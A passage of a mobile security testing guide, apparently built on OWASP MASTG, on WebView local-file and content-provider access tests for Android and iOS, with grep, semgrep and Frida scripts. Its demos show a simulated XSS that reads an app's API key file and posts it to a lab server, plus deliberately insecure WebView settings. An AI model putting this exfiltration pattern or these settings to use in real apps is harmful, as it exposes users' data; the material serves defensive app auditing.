JavaScript is on by default. Per navigation it is switched off with [`WKWebpagePreferences.allowsContentJavaScript`](https://developer.apple.com/documentation/webkit/wkwebpagepreferences/allowscontentjavascript) = `false` (iOS 14+, set on `configuration.defaultWebpagePreferences` or in `webView(_:decidePolicyFor:preferences:decisionHandler:)`); the older `WKPreferences.javaScriptEnabled` is deprecated since iOS 14. Disabling content JavaScript stops page scripts but not scripts the app injects with `WKUserScript` or `evaluateJavaScript`. `javaScriptCanOpenWindowsAutomatically` controls pop-ups.

#### `WKURLSchemeHandler`

[`WKURLSchemeHandler`](https://developer.apple.com/documentation/webkit/wkurlschemehandler) (iOS 11+) is the iOS counterpart of `WebViewAssetLoader`: register a handler for a custom scheme on the configuration with `setURLSchemeHandler(_:forURLScheme:)` before creating the web view, then load `myapp://app/index.html`. WebKit asks the handler for every request in that scheme (`webView(_:start:)` with a `WKURLSchemeTask`), and the handler answers with a response and data. Schemes WebKit handles itself (`http`, `https`, `file` and others) cannot be registered; `WKWebView.handlesURLScheme(_:)` tells you which. Capacitor's `capacitor://localhost` is a well-known example.

Pages served this way have a `myapp://app` origin, so the file-URL preferences do not apply and normal same-origin rules do. The handler is the access control, and the same mistakes as Android's custom loaders show up: mapping `url.path` onto a base directory without standardising it, decoding percent-escapes (`..%2F`) after validation, ignoring the host, or serving from a writable directory.

#### Network security, mixed content and bridges (summary)

`WKWebView` loads are subject to App Transport Security, with a dedicated relaxation, `NSAllowsArbitraryLoadsInWebContent`; WebKit blocks active mixed content (an http script on an https page) regardless of ATS, and `hasOnlySecureContent` reports the final state of a page. These matter here because a local page that pulls a script over http hands a network attacker the local file context (MAS-ATTACK-0051); details are in [MASWE-0026](/mobile/maswe-0026-cleartext-network-traffic/). Script-to-native messaging goes through `WKScriptMessageHandler` (`window.webkit.messageHandlers.<name>.postMessage(…)`), registered with `WKUserContentController.add(_:name:)`, optionally scoped to a `WKContentWorld`; `UIWebView` used `JSContext` and `JSExport`. All of that is tested in [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/).

#### Web Inspector

Safari's Web Inspector (Safari > Develop > *device* on a Mac, with *Web Inspector* enabled on the device under Settings > Safari > Advanced) attaches to `WKWebView`s whose `isInspectable` is `true`. Since iOS 16.4 that property defaults to `false`; before 16.4, apps built for development were inspectable automatically. On a test device, switch it on with Frida:

```javascript
// wk-inspectable.js
ObjC.schedule(ObjC.mainQueue, () => {
  ObjC.choose(ObjC.classes.WKWebView, {
    onMatch(wv) {
      if (wv.respondsToSelector_(ObjC.selector('setInspectable:'))) {
        wv.setInspectable_(true);
        console.log('[+] inspectable: ' + wv.URL());
      }
    },
    onComplete() {}
  });
});
```

`location.origin` in the console tells you whether a page runs in a file context (`"file://"` or `"null"`).

## Tests

OWASP files thirteen tests under MASWE-0034. Seven of them are about local resource access and are documented in full below: Android MASTG-TEST-0250 to 0253 (content and file access, each with a static and a dynamic variant) and iOS MASTG-TEST-0333, 0335 and 0336 (read scope, and the file-URL preferences statically and at runtime). The other six (Android 0334, iOS 0376 to 0380) are about JavaScript bridges; we document them in the bridge note and [point to them](#bridge-tests-owasp-files-under-maswe-0034) at the end of this section. iOS tests 0331 and 0332, which replace the same legacy iOS test as 0333, are about loading untrusted content and live in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/).

They replace these legacy (MASTG v1) tests:

| Legacy test | Replaced by |
|---|---|
| [MASTG-TEST-0032](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0032/) Testing WebView Protocol Handlers (Android) | MASTG-TEST-0250, 0251, 0252, 0253 |
| [MASTG-TEST-0031](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/) Testing JavaScript Execution in WebViews (Android) | Nothing (`covered_by` is empty): OWASP no longer treats enabled JavaScript as a finding on its own. It survives as a condition inside 0250 to 0253. |
| [MASTG-TEST-0076](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/) Testing iOS WebViews | MASTG-TEST-0333 (here), 0331 and 0332 (MASWE-0035) |
| [MASTG-TEST-0077](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/) Testing WebView Protocol Handlers (iOS) | MASTG-TEST-0335, 0336 |

(The legacy bridge tests, Android MASTG-TEST-0033 and iOS MASTG-TEST-0078, are replaced by 0334 and 0376 to 0380 in MASWE-0033.)

All seven OWASP tests establish ingredient 1 from the [Overview](#overview): a WebView with local reach. Each one ends with "further validation required", which is where most of the work is. No OWASP test covers hand-rolled resource loaders (`shouldInterceptRequest`, `WKURLSchemeHandler`); review them in code against the pitfalls in the Knowledge sections and the [secure patterns](#secure-patterns-guler-tech).

### Before you start: inventory every WebView

One static pass finds candidates for all the tests, and tells you where the content of each WebView comes from.

**Android.**

```bash
adb shell pm path com.example.app                       # base and split APKs
adb pull /data/app/~~XXXX/com.example.app-YYYY/base.apk
jadx -d out base.apk
aapt2 d badging base.apk | grep -E "^sdkVersion|^targetSdkVersion"

# Settings, loads and loaders in app code (leave out libraries you are not testing)
grep -rnE 'getSettings\(\)|setJavaScriptEnabled|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|setAllowContentAccess|loadUrl\(|loadDataWithBaseURL|loadData\(|shouldInterceptRequest|WebResourceResponse|WebViewAssetLoader|addJavascriptInterface|addWebMessageListener' \
    out/sources/ | grep -vE '^out/sources/(androidx|kotlin|kotlinx)/' > webview-hits.txt

# Which source files configure a WebView but never disable content access?
grep -rl 'getSettings()' out/sources/ | while read -r f; do
  grep -q 'setAllowContentAccess(false)' "$f" || echo "$f"
done
```

Kotlin property syntax (`settings.allowFileAccess = true`) compiles to the setter, so jadx shows `setAllowFileAccess(true)` either way. Framework method names survive R8, so the grep works on obfuscated apps; settings applied in a shared base class or helper show up once and apply to every WebView that uses it. For hybrid apps, also check the web bundle and framework configuration:

```bash
grep -oE 'allow(FileAccess|FileAccessFromFileURLs|UniversalAccessFromFileURLs)' \
    out/resources/assets/index.android.bundle | sort | uniq -c        # React Native
grep -n 'AndroidInsecureFileModeEnabled' out/resources/res/xml/config.xml  # Cordova
```

**iOS.** Decrypt and unpack the app ([MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)), list every Mach-O (frameworks configure WebViews too), and search them all:

```bash
unzip -q App.ipa -d ipa
APP=ipa/Payload/App.app
find "$APP" -type f | while read -r f; do file "$f" | grep -q 'Mach-O' && echo "$f"; done > macho.txt
while read -r f; do
  hits=$(rabin2 -zz "$f" 2>/dev/null | grep -E 'allowFileAccessFromFileURLs|allowUniversalAccessFromFileURLs|loadFileURL:allowingReadAccessToURL:|loadFileRequest:allowingReadAccessToURL:|loadHTMLString:baseURL:|setURLSchemeHandler:forURLScheme:')
  [ -n "$hits" ] && printf '== %s\n%s\n' "$f" "$hits"
done < macho.txt

# How files and links reach the app
plutil -p "$APP/Info.plist" | grep -E 'UIFileSharingEnabled|LSSupportsOpeningDocumentsInPlace|CFBundleDocumentTypes|CFBundleURLTypes'
```

`rabin2` ([MASTG-TOOL-0129](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0129/)) lists selector names and C strings; the KVC keys are longer than 15 bytes, so Swift stores them as ordinary strings rather than inline immediates, and they show up.

**Then at runtime**, enable WebView debugging ([Android](#remote-debugging), [iOS](#web-inspector)) and walk every screen that shows web content. For each WebView, note: what it loads (URL or base URL), the page's `location.origin`, whether JavaScript is on, and where the content comes from (APK/IPA, downloaded bundle, remote site, user file). That table drives everything below.

### MASTG-TEST-0250: References to Content Provider Access in WebViews (Android)

Source: [MASTG-TEST-0250](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/). Platform: Android. Type: static (code). Knowledge: MASTG-KNOW-0018. Best practices: MASTG-BEST-0011, 0012, 0013, 0049.

#### Overview

The test finds WebViews in which script could read data through `content://` URLs. Content access is on unless the app calls `setAllowContentAccess(false)`, whatever its `minSdkVersion` or `targetSdkVersion`, so the absence of that call is what you are looking for. With content access on, a page can reach the app's own providers even when they are **not exported**, and other apps' providers that are exported without adequate permissions. Two OWASP notes worth keeping: `android:grantUriPermissions` does not matter here (it governs grants to other apps; a `FileProvider` must have it set to `true` anyway or it throws `SecurityException: Provider must grant uri permissions`), and for a `file://` page the decisive extra setting is `allowUniversalAccessFromFileURLs`. Without it, the read fails with this logcat line while any outbound request still goes through:

```text
[INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'
from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported
for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
```

#### Prerequisites

- The APK decompiled with jadx ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/)).
- semgrep ([MASTG-TOOL-0110](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/)) with the OWASP rule `mastg-android-webview-allow-local-access.yml`, or grep.
- The decoded manifest ([MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/)) and `xmlstarlet` or grep ([MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/)).

#### Steps

1. **Decompile** the app: `jadx -d out app.apk`.
2. **Find the WebView settings** ([MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/)). The OWASP rule matches `getSettings()` and each relevant setter, whatever its argument:

   ```yaml
   rules:
     - id: mastg-android-webview-settings
       severity: INFO
       languages: [java]
       message: "[MASVS-PLATFORM-2] Detected WebView settings."
       pattern-either:
         - pattern: $WEBVIEW.getSettings(...);
         - pattern: $SETTINGS.setJavaScriptEnabled($ARG);
         - pattern: $SETTINGS.setAllowContentAccess($ARG);
         - pattern: $SETTINGS.setAllowFileAccessFromFileURLs($ARG);
         - pattern: $SETTINGS.setAllowFileAccess($ARG);
         - pattern: $SETTINGS.setAllowUniversalAccessFromFileURLs($ARG);
   ```

   ```bash
   semgrep -c mastg-android-webview-allow-local-access.yml out/sources/ --json > wv-settings.json
   ```

   The rule is a locator: a `getSettings()` hit with no `setAllowContentAccess` hit near it is the interesting case. Group the results per WebView instance (per method or class that configures it), and record for each one the value of every setter or "not called".
3. **Find what each WebView loads.** From the same hits, follow the WebView to its `loadUrl`, `loadDataWithBaseURL` and `loadData` calls. A page at a `file://` origin (a `file:` URL or a `file:///` base URL) or a `content://` origin is what the content route needs; a page at an https origin cannot use `content://` at all.
4. **List the providers** and what they expose:

   ```bash
   jadx --no-src -d man app.apk
   xmlstarlet sel -N android=http://schemas.android.com/apk/res/android -t \
     -m '//provider' -v '@android:name' -o ' | ' -v '@android:authorities' \
     -o ' | exported=' -v '@android:exported' -o ' | readPermission=' -v '@android:readPermission' -n \
     man/resources/AndroidManifest.xml

   # FileProvider path files: find the resource named in FILE_PROVIDER_PATHS and read it
   grep -A2 'FILE_PROVIDER_PATHS' man/resources/AndroidManifest.xml
   cat man/resources/res/xml/filepaths.xml
   ```

   For each provider, note whether it can serve anything sensitive: a `FileProvider` with `path="."` or `<root-path>`, a database-backed provider with user records, a provider proxying files by name.

#### Observation

Per WebView: the values of `setJavaScriptEnabled`, `setAllowContentAccess` (explicit or default) and `setAllowUniversalAccessFromFileURLs` (and `setAllowFileAccessFromFileURLs`), the load call and the resulting origin. Per provider: authority, export status, permissions, and the data or paths it serves.

#### Evaluation

The test **fails**, as OWASP defines it, when all of the following hold for a WebView:

- `setJavaScriptEnabled(true)` is called;
- `setAllowContentAccess` is called with `true` or not called at all;
- `setAllowUniversalAccessFromFileURLs(true)` is called.

We add one case the OWASP criteria miss: JavaScript on, content access on, and `setAllowFileAccessFromFileURLs(true)`, in a WebView that can be made to load a `content://` page (for example a URL taken from an intent). Chromium's documentation is explicit that this lets the `content://` page read other `content://` URLs.

Then rate with the provider list: the failure matters in proportion to what the reachable providers serve. Content access on with neither relaxation flag set is not a vulnerability on its own; report it as a hardening item (see [Rating findings](#rating-findings)).

#### Demo

[MASTG-DEMO-0029](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/). The sample declares a non-exported `FileProvider` whose path file maps the whole of `filesDir` (`<files-path name="internal_files" path="." />`), writes `api-key.txt` there, and simulates an XSS by loading attacker HTML with a `file:///` base URL:

```kotlin
webView.settings.apply {
    javaScriptEnabled = true
    allowUniversalAccessFromFileURLs = true
    // allowContentAccess not set: stays true
}
// injected script, inside vulnerableHtml:
//   xhr.open("GET", "content://org.owasp.mastestapp.fileprovider/internal_files/api-key.txt", true)
//   ... then fetch('http://10.0.2.2:5001/receive', { method: 'POST', body: xhr.responseText })
webView.loadDataWithBaseURL("file:///", vulnerableHtml, "text/html", "UTF-8", null)
```

semgrep on the decompiled class:

```text
┌─────────────────┐
│ 3 Code Findings │
└─────────────────┘
    MastgTestWebView_reversed.java
     ❱ rules.mastg-android-webview-settings
          [MASVS-PLATFORM-2] Detected WebView settings.
           27┆ WebSettings $this$mastgTest_u24lambda_u240 = webView.getSettings();
           28┆ $this$mastgTest_u24lambda_u240.setJavaScriptEnabled(true);
           29┆ $this$mastgTest_u24lambda_u240.setAllowUniversalAccessFromFileURLs(true);
```

There is no `setAllowContentAccess` line, so it keeps its default. The test fails: `JavaScriptEnabled: true`, `AllowContentAccess: true` (default), `AllowUniversalAccessFromFileURLs: true`. (The OWASP demo text says "4 results"; its own output shows three, which is the point: the missing fourth call is the finding.)

### MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews (Android)

Source: [MASTG-TEST-0251](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/). Platform: Android. Type: dynamic (hooks), manual. Knowledge: MASTG-KNOW-0018. Best practices: MASTG-BEST-0011, 0012, 0013, 0049.

#### Overview

The dynamic counterpart of 0250. Static analysis cannot always tell which WebView ends up with which settings: settings applied through helpers, reflection, a framework, or values computed at runtime. Hooking either **reads the effective settings of every live WebView** (OWASP's approach) or **logs every setter call with its caller** (ours, below). Use both: the first gives you the final state, the second shows which code set it.

#### Prerequisites

- A rooted device or emulator with `frida-server` ([MASTG-TOOL-0001](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0001/)), and the app installed ([MASTG-TECH-0005](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0005/): `adb install app.apk`, or `adb install-multiple base.apk split_*.apk` for split APKs).
- The provider list from MASTG-TEST-0250.

#### Steps

1. **Enumerate WebViews and their settings** with OWASP's script from DEMO-0030 ([MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/)). It hooks `WebView.getSettings()`, prints a backtrace the first time the app calls it, then uses `Java.choose("android.webkit.WebView", …)` to find every live instance and prints `getJavaScriptEnabled()`, `getAllowFileAccess()`, `getAllowFileAccessFromFileURLs()`, `getAllowUniversalAccessFromFileURLs()`, `getAllowContentAccess()`, `getMixedContentMode()` and `getSafeBrowsingEnabled()` on the main thread:

   ```bash
   frida -U -f com.example.app -l script.js -o output.txt
   ```

2. **Log the setters and the loads** with this script, which hooks the concrete settings class that the WebView package supplies (the framework's `WebSettings` is abstract, so hooking it directly catches nothing):

   ```javascript
   // wv-trace.js: WebSettings setters and WebView loads, with callers
   Java.perform(() => {
     const Log = Java.use('android.util.Log');
     const Exception = Java.use('java.lang.Exception');
     const caller = () => Log.getStackTraceString(Exception.$new()).split('\n').slice(2, 7).join('\n');
     const setters = ['setJavaScriptEnabled', 'setAllowFileAccess', 'setAllowFileAccessFromFileURLs',
                      'setAllowUniversalAccessFromFileURLs', 'setAllowContentAccess'];
     const hooked = new Set();
     const WebView = Java.use('android.webkit.WebView');

     WebView.getSettings.implementation = function () {
       const settings = this.getSettings();
       const implName = settings.getClass().getName();
       if (!hooked.has(implName)) {
         hooked.add(implName);
         const Impl = Java.ClassFactory.get(settings.getClass().getClassLoader()).use(implName);
         setters.forEach(name => {
           Impl[name].overload('boolean').implementation = function (value) {
             console.log(`[WebSettings] ${name}(${value})\n${caller()}`);
             return this[name](value);
           };
         });
       }
       return settings;
     };

     WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
       console.log(`[WebView] loadUrl(${url})`);
       return this.loadUrl(url);
     };
     WebView.loadDataWithBaseURL.implementation = function (base, data, mime, enc, history) {
       console.log(`[WebView] loadDataWithBaseURL(base=${base}, ${data ? data.length : 0} chars)`);
       return this.loadDataWithBaseURL(base, data, mime, enc, history);
     };
   });
   ```

   ```bash
   frida -U -f com.example.app -l wv-trace.js -o wv-trace.txt
   ```

3. **Exercise the app.** WebViews are usually created lazily, per screen: open every help page, article, chat, payment flow, document viewer and deep-link target, log in and repeat. Rerun the enumeration after each new screen.
4. **Map backtraces to code** ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)): for each setter call, open the calling method in jadx-gui and identify the WebView instance and what it loads.

#### Observation

The settings of every WebView instance found, the setter calls with arguments and callers, and the URL or base URL of every load.

#### Evaluation

The test **fails** when a WebView has `JavaScriptEnabled = true`, `AllowContentAccess = true` and `AllowUniversalAccessFromFileURLs = true` at runtime (and, in our extension, `AllowFileAccessFromFileURLs = true` with a page that can run at a `content://` origin). Then complete OWASP's further validation:

- Which WebView received the configuration, and does it handle sensitive data or functionality?
- Does it load content at a `file://` or `content://` origin, where `content://` reads are possible at all?
- Can attacker-controlled script run there, and can it reach providers that serve sensitive data (the 0250 list)?

The enumeration shows final values only, so it cannot distinguish "set to `true`" from "left at the default"; the setter log can.

#### Demo

[MASTG-DEMO-0030](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/), the same app as DEMO-0029, run with the enumeration script while a small Python server on the host (reached from the emulator at `10.0.2.2:5001`) logs POST bodies:

```text
[*] WebView.getSettings() called on instance: android.webkit.WebView{5c7fac1 VFEDHVC.. ......I. 0,0-0,0}
Backtrace:
android.webkit.WebView.getSettings(Native Method)
org.owasp.mastestapp.MastgTestWebView.mastgTest(MastgTestWebView.kt:25)
...
[*] Found WebView instance: android.webkit.WebView{5c7fac1 VFEDHVC.. ........ 0,0-904,1796}
	[+] JavaScriptEnabled: true
	[+] AllowFileAccess: false
	[+] AllowFileAccessFromFileURLs: false
	[+] AllowUniversalAccessFromFileURLs: true
	[+] AllowContentAccess: true
	[+] MixedContentMode: 1
	[+] SafeBrowsingEnabled: true
```

```text
[*] Received POST data from 127.0.0.1:
MASTG_API_KEY=<value of filesDir/api-key.txt>
```

Note `AllowFileAccess: false`: the attack read a file in internal storage without file access, because it went through the app's own `FileProvider`. The test fails. The demo sets `usesCleartextTraffic="true"` only so the lab server can be plain HTTP.

### MASTG-TEST-0252: References to Local File Access in WebViews (Android)

Source: [MASTG-TEST-0252](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/). Platform: Android. Type: static (code). Knowledge: MASTG-KNOW-0018. Best practices: MASTG-BEST-0010, 0011, 0012.

#### Overview

The test finds WebViews in which a local page's script can read other local files: `setAllowFileAccess` (load `file://` at all), `setAllowFileAccessFromFileURLs` (read other files) and `setAllowUniversalAccessFromFileURLs` (read anything). Together they let a malicious HTML file escalate from "displayed" to "reads and sends the app's files". Points from the OWASP test to keep in mind:

- One of the two relaxation flags must be `true` for the read to work. With both `false`, logcat shows the CORS error below and the attacker's server receives the failure message instead of the file:

  ```text
  [INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'file:///data/data/org.owasp.mastestapp/files/api-key.txt' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
  [INFO:CONSOLE(31)] "File content sent successfully.", source: file:/// (31)
  ```

  The second line is the proof that sending never needed a flag.
- `setAllowFileAccessFromFileURLs` is ignored when `setAllowUniversalAccessFromFileURLs` is `true`.
- The two relaxation methods are deprecated since API 30 (the OWASP test says "Android 10 (API level 29)"; the Android reference says API 30), but deprecated methods still work.
- **Absent calls matter.** Where defaults are insecure for the app's target level, no call means exposed, so try to account for every WebView instance.

#### Prerequisites

As for 0250, plus the app's `minSdkVersion` and `targetSdkVersion` (`aapt2 d badging app.apk`, or `<uses-sdk>` in jadx's manifest output; apktool puts them in `apktool.yml`).

#### Steps

1. Decompile the app and run the semgrep rule (or the grep) from 0250; record per WebView the value of `setJavaScriptEnabled`, `setAllowFileAccess`, `setAllowFileAccessFromFileURLs` and `setAllowUniversalAccessFromFileURLs`, or "not called".
2. Read the SDK levels from the manifest ([MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/), [MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/)):

   ```bash
   aapt2 d badging app.apk | grep -E "^sdkVersion|^targetSdkVersion"
   ```

3. Resolve "not called" to an effective value with the [defaults table](#webview-local-file-access-settings): `allowFileAccess` is `true` when the app targets API 29 or lower; the two relaxation flags are `true` only when it targets API 15 or lower.
4. For each WebView with an effective `true`, find what it loads and whether that page runs at a `file://` origin: `loadUrl("file://…")`, `loadDataWithBaseURL("file:///…", …)`, or a URL taken from outside (intent extra, deep-link parameter, server response) that could be a `file://` URL.

#### Observation

Per WebView: the four values (explicit or default with the SDK level that decides it), the load calls and their origin, and the source of any externally supplied URL.

#### Evaluation

OWASP's test **fails** when all of the following hold:

- `setJavaScriptEnabled(true)`;
- `setAllowFileAccess(true)`, or not called while the default is `true`;
- `setAllowFileAccessFromFileURLs(true)` or `setAllowUniversalAccessFromFileURLs(true)`, or not called while their default is `true`.

OWASP keys the defaults on `minSdkVersion` (< 30 and < 16). Following the Android reference, we key them on `targetSdkVersion` (≤ 29 and ≤ 15): an app with `minSdkVersion` 24 and `targetSdkVersion` 35 has `allowFileAccess = false` by default on every device. In practice the relaxation-flag defaults no longer matter (nothing on Play targets API 15), so a failure almost always means an explicit `true` in code.

`setAllowFileAccess(true)` alone, without either relaxation flag, does not fail the test: a page can then load and display local files but its script cannot read them.

#### Demo

[MASTG-DEMO-0032](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/). The sample writes `filesDir/api-key.txt`, then loads XSS-simulating HTML with a `file:///` base URL whose script reads that file by absolute path with `XMLHttpRequest` (a local read succeeds with status `0` and a non-empty `responseText`) and posts it out:

```kotlin
webView.settings.apply {
    javaScriptEnabled = true
    allowFileAccess = true                  // the app has minSdkVersion 29; explicit true either way
    allowFileAccessFromFileURLs = true      // enough on its own: universal access left unset
}
// injected script: xhr.open("GET", "/data/user/0/org.owasp.mastestapp/files/api-key.txt", true)
webView.loadDataWithBaseURL("file:///", vulnerableHtml, "text/html", "UTF-8", null)
```

```text
┌─────────────────┐
│ 4 Code Findings │
└─────────────────┘
    MastgTestWebView_reversed.java
     ❱ rules.mastg-android-webview-settings
           29┆ WebSettings $this$mastgTest_u24lambda_u240 = webView.getSettings();
           30┆ $this$mastgTest_u24lambda_u240.setJavaScriptEnabled(true);
           31┆ $this$mastgTest_u24lambda_u240.setAllowFileAccess(true);
           32┆ $this$mastgTest_u24lambda_u240.setAllowFileAccessFromFileURLs(true);
```

The test fails: JavaScript, file access and file access from file URLs are all explicitly `true`.

### MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews (Android)

Source: [MASTG-TEST-0253](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/). Platform: Android. Type: dynamic (hooks), manual. Knowledge: MASTG-KNOW-0018. Best practices: MASTG-BEST-0010, 0011, 0012.

#### Overview

The dynamic counterpart of 0252: confirm the effective file settings of each live WebView and which code set them, either by enumerating instances or by hooking the setters `setJavaScriptEnabled`, `setAllowFileAccess`, `setAllowFileAccessFromFileURLs` and `setAllowUniversalAccessFromFileURLs`.

#### Prerequisites

As for 0251.

#### Steps

1. Spawn the app with OWASP's enumeration script and with `wv-trace.js` from [MASTG-TEST-0251](#mastg-test-0251-runtime-use-of-content-provider-access-apis-in-webviews-android):

   ```bash
   frida -U -f com.example.app -l script.js -o output.txt
   frida -U -f com.example.app -l wv-trace.js -o wv-trace.txt
   ```

2. Exercise every web-backed screen, including logged-in and offline states (offline modes are where local HTML bundles tend to appear).
3. For each WebView with file reading enabled, use the backtrace to find the code ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)) and the `loadUrl`/`loadDataWithBaseURL` lines in `wv-trace.txt` to find what it shows.

#### Observation

The effective settings per WebView, the setter calls with arguments and callers, and the loads with their URLs or base URLs.

#### Evaluation

The test **fails** under the same three conditions as 0252, evaluated on the runtime values. Then complete OWASP's further validation:

- Were the settings set explicitly (setter log) or are they defaults?
- Which WebView has them, and does it handle sensitive information or functionality?
- Does it load local `file://` content, through `loadUrl("file://…")` or `loadDataWithBaseURL` with a `file://` base?
- Can attacker-controlled script run in that local context (HTML or script injection, a URL from outside, a downloaded or received file), and could it exfiltrate files?

#### Demo

[MASTG-DEMO-0031](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/), the same app as DEMO-0032 at runtime:

```text
[*] Found WebView instance: android.webkit.WebView{72e86a8 VFEDHVC.. ........ 0,0-904,1796}
	[+] JavaScriptEnabled: true
	[+] AllowFileAccess: true
	[+] AllowFileAccessFromFileURLs: true
	[+] AllowUniversalAccessFromFileURLs: false
	[+] AllowContentAccess: true
	[+] MixedContentMode: 1
	[+] SafeBrowsingEnabled: true
```

```text
[*] Received POST data from 127.0.0.1:
MASTG_API_KEY=<value of filesDir/api-key.txt>
```

The test fails. As OWASP notes, the enumeration alone cannot prove the values were set explicitly, but `AllowFileAccessFromFileURLs` has defaulted to `false` since API 16, so here it must have been.

### MASTG-TEST-0333: Overly Broad File Read Access in WebViews (iOS)

Source: [MASTG-TEST-0333](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0333/). Platform: iOS. Type: static (code), manual. Knowledge: MASTG-KNOW-0076. Best practice: MASTG-BEST-0033.

#### Overview

The test finds calls to `loadFileURL(_:allowingReadAccessTo:)` (and, by extension, `loadFileRequest(_:allowingReadAccessTo:)`) whose read-access URL is broader than the page needs: the whole `Documents` directory, `Library`, `Caches`, the container root. The read scope is the sandbox extension the WebContent process receives, so it bounds what any injected markup or script can reach. A broad scope is harmless while the page is trusted and static, and turns a separate injection bug into local file disclosure when it is not.

#### Prerequisites

- A decrypted app binary ([MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)).
- radare2 ([MASTG-TOOL-0073](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/)) or another disassembler for review ([MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/)); source code if you have it.

#### Steps

1. **Find the call sites.** Swift's `loadFileURL(_:allowingReadAccessTo:)` is the Objective-C selector `loadFileURL:allowingReadAccessToURL:`, sent through `objc_msgSend`:

   ```bash
   rabin2 -zz Payload/App.app/App | grep -E 'loadFileURL:allowingReadAccessToURL:|loadFileRequest:allowingReadAccessToURL:'
   r2 -q -e bin.relocs.apply=true -A -c 'f~loadFileURL' Payload/App.app/App
   # take the address of the reloc.fixup.loadFileURL:... line from the output, then:
   r2 -q -e bin.relocs.apply=true -A -c 'axt @ 0x100018118' Payload/App.app/App
   ```

   Each `axt` result is a function that loads that selector; disassemble it with `pdf @ <function>`.
2. **Trace both arguments.** On arm64, `objc_msgSend` receives the receiver in `x0`, the selector in `x1`, the file URL in `x2` and the read-access URL in `x3`. Walk back from the call to where `x2` and `x3` are produced. In Swift they are typically lazy statics or locals built from `FileManager.default.urls(for:in:)`, which bridges to `URLsForDirectory:inDomains:` with two integer constants you can read straight from the disassembly:

   | `NSSearchPathDirectory` value | Directory |
   |---|---|
   | 5 | `.libraryDirectory` |
   | 9 | `.documentDirectory` |
   | 13 | `.cachesDirectory` |
   | 14 | `.applicationSupportDirectory` |

   The second constant is the domain mask, `1` for `.userDomainMask`. Follow any `appendingPathComponent` calls after that (short Swift strings appear as inline immediates such as `mov x2, 0x6e69` / `movk …`; r2 annotates the ASCII). Other sources of a broad scope: `NSHomeDirectory()`, `FileManager.default.temporaryDirectory`, `Bundle.main.bundleURL` (harmless unless the bundle holds secrets), or the file URL's `deletingLastPathComponent()`.
3. **Ask whether the page can be influenced.** Check whether `fileURL`, its query string, or the file's contents can be attacker-controlled: built from a deep-link or URL-scheme parameter, a downloaded or received file, user input inserted into the DOM. Search the HTML templates and JavaScript in the bundle for sinks (`innerHTML`, `document.write`, `insertAdjacentHTML`, `outerHTML`).
4. **List what else is in the scope.** On a test device or simulator, list the granted directory (`objection` `env` shows the container paths; `ls` on a jailbroken device; `xcrun simctl get_app_container booted <bundle-id> data` on a simulator) and note any sensitive files: databases, tokens, `Library/Preferences/<bundle-id>.plist`, cookies, downloaded documents.

#### Observation

Each call site with the resolved file URL and read-access URL, whether the file URL or page content can be influenced, and the sensitive files inside the read scope.

#### Evaluation

The test **fails** if a `loadFileURL(_:allowingReadAccessTo:)` call grants broader read access than the page needs, for example the whole `Documents` directory or the container root. Complete OWASP's further validation: can the `fileURL` be influenced by attacker input; does `readAccessURL` grant more than necessary; is the scope limited to the minimum directory holding the intended content. A broad scope containing nothing sensitive and serving only static bundled pages is an observation; a broad scope plus an injection point plus sensitive siblings is a finding whose rating depends on whether script can also read (see 0335).

